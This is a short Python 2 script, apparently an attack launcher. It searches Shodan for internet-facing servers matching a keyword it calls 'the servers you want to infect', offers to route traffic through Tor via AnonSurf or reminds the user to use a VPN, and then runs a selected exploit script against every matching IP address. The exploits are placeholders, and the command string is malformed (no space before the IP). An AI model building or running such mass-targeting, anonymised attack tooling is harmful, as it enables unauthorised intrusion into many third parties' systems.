import shodan
from shodan import Shodan
import os, subprocess, sys, time
from apikey import APIkey

api = Shodan(APIkey) # Go to the APIkey file and add your API key to search for devices with Shodans API

anon = raw_input("\nDo you want to use AnonSurf (tor)? [y/n]: ") # AnonSurf will wrap your connection in tor

if anon == "y":
    AnonSurf = subprocess.call("sudo anonsurf start", shell=True)
    print(AnonSurf)
elif anon == "n":
    print("\nMake sure you have a VPN on!")
else:
    sys.exit("\nYou did not enter a valid option.")

machine = raw_input("\n(Shodan) Type the keyword for the servers you want to infect: ") # Searches devices with users input
try:
        # Search Shodan
        results = api.search(machine)
        # Show results
        print "\n"+machine+" Server Results: %s" % results['total']
        choice = raw_input("""\nPick an option: \n 1) ExampleExploit1 \n 2) ExampleExploit2 \n: """) # Option's menu
        for result in results['matches']:
	# Options
            if choice == "1":
                print "IP Address for "+machine+" : "+result['ip_str'] # Print Device
                command = 'python2.7 ExampleExploit1'+result['ip_str'] # Prepare the exploit command
                cmdOutput = subprocess.call(command,shell=True) # Execute the exploit command
                print cmdOutput # Print the exploit command
		print result['data'] # Print the device information/data
                print('\n\n') # Create a new line so you can see what is happening

            elif choice == "2":
		print("2 Was Picked. You get the idea")

            else:
                print("You didn't pick a valid option!")
                break

except shodan.APIError, e:
        print 'Error: %s' % e
